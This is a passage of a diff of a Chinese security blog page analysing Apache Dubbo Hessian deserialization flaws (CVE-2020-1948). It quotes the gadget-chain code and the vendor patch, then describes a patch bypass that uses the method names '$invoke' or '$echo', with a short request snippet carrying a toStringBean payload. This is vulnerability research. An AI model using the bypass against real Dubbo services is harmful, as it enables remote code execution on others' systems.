-    protected void doReadMap(AbstractHessianInput in, Map map, Class&lt;?&gt; keyType, Class&lt;?&gt; valueType) throws IOException &#123;
-        Deserializer keyDeserializer = null;
-        Deserializer valueDeserializer = null;
-        SerializerFactory factory = this.findSerializerFactory(in);
-        if (keyType != null) &#123;
-            keyDeserializer = factory.getDeserializer(keyType.getName());
-        &#125;
-
-        if (valueType != null) &#123;
-            valueDeserializer = factory.getDeserializer(valueType.getName());
-        &#125;
-
-        while(!in.isEnd()) &#123;
-            map.put(keyDeserializer != null ? keyDeserializer.readObject(in) : in.readObject(), valueDeserializer != null ? valueDeserializer.readObject(in) : in.readObject()); // 进行反序列化两次
-        &#125;
-
-    &#125;</code></pre>
 <p>因为我们的hashMap类在反序列化时会调用hashCode()方法进行赋值</p>
-<pre><code class="java">public class EqualsBean implements Serializable &#123;
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EqualsBean</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.beanHashCode(); <span class="comment">// 跟进beanHashCode()</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">beanHashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.obj.toString().hashCode(); <span class="comment">// 跟进toString()</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        </span><br><span class="line">        ...</span><br><span class="line">        result = <span class="built_in">this</span>.toString(prefix); <span class="comment">// 跟进toString()</span></span><br><span class="line">        <span class="keyword">if</span> (needStackCleanup) &#123;</span><br><span class="line">            PREFIX_TL.remove();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">toString</span><span class="params">(String prefix)</span> &#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(<span class="number">128</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            List&lt;PropertyDescriptor&gt; propertyDescriptors = BeanIntrospector.getPropertyDescriptorsWithGetters(<span class="built_in">this</span>.beanClass);</span><br><span class="line">            <span class="type">Iterator</span> <span class="variable">var10</span> <span class="operator">=</span> propertyDescriptors.iterator();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(var10.hasNext()) &#123;</span><br><span class="line">                <span class="type">PropertyDescriptor</span> <span class="variable">propertyDescriptor</span> <span class="operator">=</span> (PropertyDescriptor)var10.next();</span><br><span class="line">                <span class="type">String</span> <span class="variable">propertyName</span> <span class="operator">=</span> propertyDescriptor.getName();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">getter</span> <span class="operator">=</span> propertyDescriptor.getReadMethod();</span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getter.invoke(<span class="built_in">this</span>.obj, NO_PARAMS); <span class="comment">// 调用了get()方法，后面的步骤和上面一样</span></span><br><span class="line">                <span class="built_in">this</span>.printProperty(sb, prefix + <span class="string">&quot;.&quot;</span> + propertyName, value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var9) &#123;</span><br><span class="line">            LOG.error(<span class="string">&quot;Error while generating toString&quot;</span>, var9);</span><br><span class="line">            Class&lt;? <span class="keyword">extends</span> <span class="title class_">Object</span>&gt; clazz = <span class="built_in">this</span>.obj.getClass();</span><br><span class="line">            <span class="type">String</span> <span class="variable">errorMessage</span> <span class="operator">=</span> var9.getMessage();</span><br><span class="line">            sb.append(String.format(<span class="string">&quot;\n\nEXCEPTION: Could not complete %s.toString(): %s\n&quot;</span>, clazz, errorMessage));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
-    public int hashCode() &#123;
-        return this.beanHashCode(); // 跟进beanHashCode()
-    &#125;
-
-    public int beanHashCode() &#123;
-        return this.obj.toString().hashCode(); // 跟进toString()
-    &#125;
-
-    public String toString() &#123;
-
-        ...
-        result = this.toString(prefix); // 跟进toString()
-        if (needStackCleanup) &#123;
-            PREFIX_TL.remove();
-        &#125;
-
-        return result;
-    &#125;
-
-    private String toString(String prefix) &#123;
-        StringBuffer sb = new StringBuffer(128);
-
-        try &#123;
-            List&lt;PropertyDescriptor&gt; propertyDescriptors = BeanIntrospector.getPropertyDescriptorsWithGetters(this.beanClass);
-            Iterator var10 = propertyDescriptors.iterator();
-
-            while(var10.hasNext()) &#123;
-                PropertyDescriptor propertyDescriptor = (PropertyDescriptor)var10.next();
-                String propertyName = propertyDescriptor.getName();
-                Method getter = propertyDescriptor.getReadMethod();
-                Object value = getter.invoke(this.obj, NO_PARAMS); // 调用了get()方法，后面的步骤和上面一样
-                this.printProperty(sb, prefix + &quot;.&quot; + propertyName, value);
-            &#125;
-        &#125; catch (Exception var9) &#123;
-            LOG.error(&quot;Error while generating toString&quot;, var9);
-            Class&lt;? extends Object&gt; clazz = this.obj.getClass();
-            String errorMessage = var9.getMessage();
-            sb.append(String.format(&quot;\n\nEXCEPTION: Could not complete %s.toString(): %s\n&quot;, clazz, errorMessage));
-        &#125;
-
-        return sb.toString();
-    &#125;</code></pre>
 <p><strong>patch1</strong></p>
 <blockquote>
 <p><a target="_blank" rel="noopener" href="https://github.com/apache/dubbo/compare/dubbo-2.7.6...dubbo-2.7.7#diff-a32630b1035c586f6eae2d778e19fc172e986bb0be1d4bc642f8ee79df48ade0R133">https://github.com/apache/dubbo/compare/dubbo-2.7.6...dubbo-2.7.7#diff-a32630b1035c586f6eae2d778e19fc172e986bb0be1d4bc642f8ee79df48ade0R133</a></p>
@@ -632,31 +311,11 @@ public String commonTest(Object o) &#123;
 <p>在<code>DecodeableRpcInvocation</code>类中增加对参数的判断，用<code>String.equals()</code>方法对比了<code>method</code>参数是否和<code>INVOKE_ASYNC</code>常量的值是否相同</p>
 <p><strong>patch绕过</strong></p>
 <p>在if条件中，<code>method</code>参数会进入<code>isEcho()</code>函数，用<code>String.equals()</code>方法对比了<code>$ECHO</code>常量的值和<code>method</code>参数是否相同</p>
-<pre><code class="java">public class DecodeableRpcInvocation extends RpcInvocation implements Codec, Decodeable &#123;
-    ...
-    if (pts == DubboCodec.EMPTY_CLASS_ARRAY) &#123;
-        if (!RpcUtils.isGenericCall(path, getMethodName()) &amp;&amp; !RpcUtils.isEcho(path, getMethodName())) &#123; // 新增判断
-            throw new IllegalArgumentException(&quot;Service not found:&quot; + path + &quot;, &quot; + getMethodName());
-        &#125;
-        pts = ReflectUtils.desc2classArray(desc);
-    &#125;
-    ...
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DecodeableRpcInvocation</span> <span class="keyword">extends</span> <span class="title class_">RpcInvocation</span> <span class="keyword">implements</span> <span class="title class_">Codec</span>, Decodeable &#123;</span><br><span class="line">	...</span><br><span class="line">    <span class="keyword">if</span> (pts == DubboCodec.EMPTY_CLASS_ARRAY) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!RpcUtils.isGenericCall(path, getMethodName()) &amp;&amp; !RpcUtils.isEcho(path, getMethodName())) &#123; <span class="comment">// 新增判断</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Service not found:&quot;</span> + path + <span class="string">&quot;, &quot;</span> + getMethodName());</span><br><span class="line">        &#125;</span><br><span class="line">        pts = ReflectUtils.desc2classArray(desc);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">        </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RpcUtils</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isGenericCall</span><span class="params">(String path, String method)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> $INVOKE.equals(method) || $INVOKE_ASYNC.equals(method); <span class="comment">// String $INVOKE = &quot;$invoke&quot;; String $INVOKE_ASYNC = &quot;$invokeAsync&quot;;</span></span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> boolen <span class="title function_">isEcho</span><span class="params">(String path, String method)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> $ECHO.equals(method); <span class="comment">// String $ECHO = &quot;$echo&quot;; </span></span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
 
-public class RpcUtils &#123;
-    ...
-    public static boolean isGenericCall(String path, String method) &#123;
-        return $INVOKE.equals(method) || $INVOKE_ASYNC.equals(method); // String $INVOKE = &quot;$invoke&quot;; String $INVOKE_ASYNC = &quot;$invokeAsync&quot;;
-    &#125;
-
-    public static boolen isEcho(String path, String method) &#123;
-        return $ECHO.equals(method); // String $ECHO = &quot;$echo&quot;; 
-    &#125;
-    ...</code></pre>
 <p>所以只要让method的值等于<code>&quot;$invoke&quot;</code>，<code>&quot;$invokeAsync&quot;</code>，<code>&quot;$echo&quot;</code>任意一个即可绕过</p>
-<pre><code class="java">resp = client.send_request_and_return_response(
-    service_name=&#39;com.example.provider.service.UesrService&#39;,
-    method_name=&#39;$invoke&#39;,
-    args=[toStringBean])</code></pre>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">resp = client.send_request_and_return_response(</span><br><span class="line">    service_name=<span class="string">&#x27;com.example.provider.service.UesrService&#x27;</span>,</span><br><span class="line">    method_name=<span class="string">&#x27;$invoke&#x27;</span>,</span><br><span class="line">    args=[toStringBean])</span><br></pre></td></tr></table></figure>
+
 <p><strong>patch2</strong></p>
 <blockquote>
 <p><a target="_blank" rel="noopener" href="https://github.com/apache/dubbo/commit/5ad186fa874d9f0dfb87b989e54c1325d39abd40">https://github.com/apache/dubbo/commit/5ad186fa874d9f0dfb87b989e54c1325d39abd40</a></p>
@@ -665,4 +324,4 @@ public class RpcUtils &#123;
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/197658">dubbo源码浅析：默认反序列化利用之hessian2</a></p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7354">Dubbo反序列化RCE利用之新拓展面 - Dubbo Rouge攻击客户端</a></p>
 <p><a target="_blank" rel="noopener" href="https://f5.pm/go-28632.html">Apache Dubbo 2.7.6 反序列化漏洞复现及分析</a></p>
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Tyaoo</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://tyaoo.github.io/2021/06/30/Dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/">https://tyaoo.github.io/2021/06/30/Dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/09/25/Handlebars-AST%E6%B3%A8%E5%85%A5/"><img class="prev-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">Handlebars AST注入</div></div></a></div><div class="next-post pull-right"><a href="/2021/06/03/Yii2%E6%9C%80%E6%96%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE%E5%88%86%E6%9E%90/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Yii2最新反序列化POP链分析</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Tyaoo</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">35</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">11</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Tyaoo"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">2.1.</span> <span class="toc-text">方法一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-number">2.2.</span> <span class="toc-text">方法二</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89"><span class="toc-number">2.3.</span> <span class="toc-text">方法三</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI%E5%B7%A5%E5%85%B7"><span class="toc-number">3.</span> <span class="toc-text">JNDI工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E4%B8%80"><span class="toc-number">3.1.</span> <span class="toc-text">工具一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E4%BA%8C"><span class="toc-number">3.2.</span> <span class="toc-text">工具二</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2019-17564"><span class="toc-number">4.1.</span> <span class="toc-text">CVE-2019-17564</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2020-1948"><span class="toc-number">4.2.</span> <span class="toc-text">CVE-2020-1948</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Python%E7%89%88%E6%9C%AC"><span class="toc-number">4.2.1.</span> <span class="toc-text">Python版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Java%E7%89%88%E6%9C%AC"><span class="toc-number">4.2.2.</span> <span class="toc-text">Java版本</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Tyaoo</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Local search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body></html>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Tyaoo</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://tyaoo.github.io/2021/06/30/Dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/">https://tyaoo.github.io/2021/06/30/Dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a></div><div class="post_share"><div class="social-share" data-image="/img/banner.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/09/25/Handlebars-AST%E6%B3%A8%E5%85%A5/"><img class="prev-cover" src="/img/banner.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">Handlebars AST注入</div></div></a></div><div class="next-post pull-right"><a href="/2021/06/03/Yii2%E6%9C%80%E6%96%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE%E5%88%86%E6%9E%90/"><img class="next-cover" src="/img/banner.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Yii2最新反序列化POP链分析</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Tyaoo</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">35</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">11</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Tyaoo"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">2.1.</span> <span class="toc-text">方法一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-number">2.2.</span> <span class="toc-text">方法二</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89"><span class="toc-number">2.3.</span> <span class="toc-text">方法三</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI%E5%B7%A5%E5%85%B7"><span class="toc-number">3.</span> <span class="toc-text">JNDI工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E4%B8%80"><span class="toc-number">3.1.</span> <span class="toc-text">工具一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E4%BA%8C"><span class="toc-number">3.2.</span> <span class="toc-text">工具二</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2019-17564"><span class="toc-number">4.1.</span> <span class="toc-text">CVE-2019-17564</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2020-1948"><span class="toc-number">4.2.</span> <span class="toc-text">CVE-2020-1948</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Python%E7%89%88%E6%9C%AC"><span class="toc-number">4.2.1.</span> <span class="toc-text">Python版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Java%E7%89%88%E6%9C%AC"><span class="toc-number">4.2.2.</span> <span class="toc-text">Java版本</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Tyaoo</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Local search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body></html>
